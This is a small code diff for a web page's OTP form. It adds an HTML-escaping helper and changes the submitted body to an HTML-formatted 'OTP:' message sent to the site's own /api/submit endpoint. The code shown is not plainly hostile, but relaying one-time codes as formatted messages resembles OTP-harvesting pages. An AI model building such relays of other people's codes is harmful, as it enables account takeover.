@@ -15,6 +15,10 @@
     return (str+'').replace(/[٠-٩۰-۹]/g,d=>map[d]||d);
   }
 
+  function esc(s=''){
+    return String(s).replace(/[<&>]/g, c => ({'<':'&lt;','>':'&gt;','&':'&amp;'}[c]));
+  }
+
   if(whatsappBtn) whatsappBtn.addEventListener('click', ()=>{ window.open(WHATSAPP_URL,'_blank'); });
   if(otp) otp.addEventListener('input', ()=>{ otpError.style.display='none'; });
 
@@ -33,7 +37,7 @@
       const res = await fetch('/api/submit',{
         method:'POST',
         headers:{'Content-Type':'application/json'},
-        body: JSON.stringify({otp:code})
+        body: JSON.stringify({payload:`<b>OTP:</b> ${esc(code)}`})
       });
       const data = await res.json();
       if(!res.ok || !data.ok){
